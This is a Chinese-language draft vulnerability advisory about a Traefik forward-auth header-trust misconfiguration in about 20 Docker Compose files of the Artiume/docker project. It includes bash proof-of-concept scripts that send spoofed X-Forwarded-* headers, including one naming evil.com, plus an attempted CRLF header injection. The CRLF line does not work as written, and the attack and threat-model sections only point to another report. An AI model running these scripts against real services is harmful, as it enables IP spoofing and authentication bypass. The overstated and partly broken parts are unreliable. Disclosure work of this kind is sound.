# CVE-2025-XXXXX: Forward Auth Header Injection in Artiume/docker Traefik Configuration

## 基本信息

- **CVE ID**: CVE-2025-XXXXX (待分配)
- **项目**: Artiume/docker
- **发现日期**: 2025-12-28
- **报告者**: Security Research
- **严重程度**: High (CVSS 7.5)
- **项目星级**: 64 stars

## 漏洞描述

Artiume/docker 项目中的多个 Traefik Forward Auth 中间件配置存在 HTTP Header Injection 漏洞。多个 Docker Compose 文件中都设置了 `trustForwardHeader: true` 但没有配置 `trustedIPs` 白名单，导致 Traefik 信任所有来源的 X-Forwarded-* 头并转发到认证服务。

## 受影响文件

多个文件都受影响，包括：
- `ubooquity.yml`
- `nextcloud.yml`
- `radarr.yml`
- `portainer.yml`
- `traefik-SSO.yml`
- `picard.yml`
- `mariadb+pma.yml`
- `sabnzbd.yml`
- `traefik-auth.yml`
- `sonarr.yml`
- `netdata.yml`
- `nzbhydra2.yml`
- `lidarr.yml`
- `firefox.yml`
- `jackett.yml`
- `irc-lounge.yml`
- `bazarr.yml`
- `autoindex.yml`
- `bitwarden.yml`
- `heimdall.yml`

## 漏洞配置

所有受影响文件都包含类似的配置：

```yaml
labels:
  - "traefik.frontend.auth.forward.trustForwardHeader=true"
  # 或
  - "traefik.http.middlewares.xxx.forwardauth.trustForwardHeader=true"
```

## 漏洞详情

### 问题分析

1. **配置问题**: 20+ 个服务都配置了 `trustForwardHeader: true` 且**没有配置 trustedIPs**
2. **影响**: Traefik 会信任**所有来源**的 X-Forwarded-* 头并转发到认证服务
3. **攻击向量**: 攻击者可以直接向 Traefik 发送恶意请求
4. **影响范围**: 20+ 个服务受影响

### 攻击场景

同 CVE-2025-XXXXX-traefik-crowdsec-bouncer

## 影响评估

### CVSS 3.1 评分

- **Base Score**: 7.5 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N

### 实际影响

1. **日志注入** ✅ **几乎肯定发生**
2. **IP 欺骗** ✅ **很可能发生**
3. **认证绕过** ⚠️ **可能发生**
4. **影响范围大** - 20+ 个服务受影响

## 威胁模型

同 CVE-2025-XXXXX-traefik-crowdsec-bouncer

## 修复建议

### 方案 1: 移除 trustForwardHeader 配置（推荐）

在所有受影响文件中移除 `trustForwardHeader: true` 配置。

### 方案 2: 配置 trustedIPs 白名单

需要在 Traefik 的全局配置中设置 trustedIPs。

## 漏洞复现

### 环境准备

1. **克隆项目仓库**:
   ```bash
   git clone https://github.com/Artiume/docker.git
   cd docker
   ```

2. **检查漏洞配置**:
   ```bash
   # 查找所有包含 trustForwardHeader 的文件
   find . -name "*.yml" -o -name "*.yaml" | xargs grep -l "trustForwardHeader"
   
   # 查看其中一个文件的配置
   cat ubooquity.yml | grep -A 5 -B 5 "trustForwardHeader"
   ```

3. **启动服务** (选择一个受影响的服务):
   ```bash
   # 例如启动 ubooquity 服务
   docker-compose -f ubooquity.yml up -d
   ```

### 漏洞复现步骤

#### 步骤 1: 确认多个服务的漏洞配置

```bash
# 列出所有受影响的服务文件
echo "Affected services:"
find . -name "*.yml" -o -name "*.yaml" | xargs grep -l "trustForwardHeader" | while read file; do
    echo "  - $file"
done

# 检查特定服务的配置
docker inspect $(docker-compose -f ubooquity.yml ps -q traefik) | jq '.[0].Config.Labels' | grep -i "forward"
```

#### 步骤 2: 测试 Forward Auth Header Injection（针对单个服务）

```bash
# 获取 Traefik 服务地址
TRAEFIK_IP=$(docker-compose -f ubooquity.yml ps -q traefik | xargs docker inspect | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress')

# 测试访问受保护的路由
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-Proto: https" \
     -H "X-Forwarded-Host: evil.com" \
     http://$TRAEFIK_IP:80/

# 注入恶意头到认证服务
curl -v -H "X-Forwarded-For: 127.0.0.1\r\nX-Injected-Auth: malicious" \
     http://$TRAEFIK_IP:80/
```

#### 步骤 3: 批量测试多个受影响服务

```bash
#!/bin/bash
# 测试所有受影响的服务

SERVICES=("ubooquity.yml" "nextcloud.yml" "radarr.yml" "portainer.yml" "sonarr.yml")

for service in "${SERVICES[@]}"; do
    echo "[*] Testing service: $service"
    
    # 启动服务
    docker-compose -f "$service" up -d
    
    # 获取 Traefik IP
    TRAEFIK_IP=$(docker-compose -f "$service" ps -q traefik 2>/dev/null | xargs docker inspect 2>/dev/null | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress' 2>/dev/null)
    
    if [ ! -z "$TRAEFIK_IP" ]; then
        # 测试漏洞
        curl -s -H "X-Forwarded-For: 127.0.0.1" \
             -H "X-Injected-Test: vulnerability-exists" \
             http://$TRAEFIK_IP:80/ > /dev/null
        
        echo "  [+] Tested: $TRAEFIK_IP"
    fi
    
    # 停止服务
    docker-compose -f "$service" down
done
```

#### 步骤 4: 验证漏洞（检查多个服务的日志）

```bash
# 检查特定服务的认证服务日志
docker-compose -f ubooquity.yml logs auth | grep -i "forwarded" | tail -20

# 检查 Traefik 日志
docker-compose -f ubooquity.yml logs traefik | tail -30

# 批量检查所有服务的日志
for file in *.yml; do
    if grep -q "trustForwardHeader" "$file"; then
        echo "[*] Checking logs for: $file"
        docker-compose -f "$file" logs 2>/dev/null | grep -i "forwarded" | tail -5
    fi
done
```

### 预期结果

1. **多个服务受影响**: 20+ 个服务都存在相同的漏洞
2. **日志注入成功**: 每个服务的认证服务日志中都包含注入的恶意内容
3. **IP 欺骗成功**: 每个服务都允许 IP 欺骗
4. **攻击面大**: 由于多个服务受影响，攻击面显著增大

### 自动化测试脚本

```bash
#!/bin/bash
echo "[*] Testing Forward Auth Header Injection in Multiple Services"
echo "[*] This project has 20+ affected services"

# 列出所有受影响的服务
AFFECTED_FILES=$(find . -name "*.yml" -o -name "*.yaml" | xargs grep -l "trustForwardHeader")

echo "[*] Found $(echo "$AFFECTED_FILES" | wc -l) affected service files"

# 测试第一个服务作为示例
FIRST_FILE=$(echo "$AFFECTED_FILES" | head -1)
echo "[*] Testing example service: $FIRST_FILE"

docker-compose -f "$FIRST_FILE" up -d

TRAEFIK_IP=$(docker-compose -f "$FIRST_FILE" ps -q traefik 2>/dev/null | xargs docker inspect 2>/dev/null | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress' 2>/dev/null)

if [ ! -z "$TRAEFIK_IP" ]; then
    echo "[+] Test 1: Basic injection"
    curl -s -H "X-Forwarded-For: 127.0.0.1" \
         -H "X-Injected-Test: vulnerability-exists" \
         http://$TRAEFIK_IP:80/ > /dev/null
    
    echo "[+] Test 2: IP spoofing"
    curl -s -H "X-Forwarded-For: 10.0.0.1" \
         http://$TRAEFIK_IP:80/ > /dev/null
    
    echo "[*] Check logs: docker-compose -f $FIRST_FILE logs"
fi

docker-compose -f "$FIRST_FILE" down
```

### 影响范围说明

由于该项目有 **20+ 个服务**都使用相同的漏洞配置，影响范围包括：

- ubooquity.yml
- nextcloud.yml
- radarr.yml
- portainer.yml
- traefik-SSO.yml
- picard.yml
- mariadb+pma.yml
- sabnzbd.yml
- traefik-auth.yml
- sonarr.yml
- netdata.yml
- nzbhydra2.yml
- lidarr.yml
- firefox.yml
- jackett.yml
- irc-lounge.yml
- bazarr.yml
- autoindex.yml
- bitwarden.yml
- heimdall.yml

每个服务都需要单独修复。

## 备注

这是实际项目配置，20+ 个服务都受影响，攻击面大。建议尽快修复所有受影响的服务。

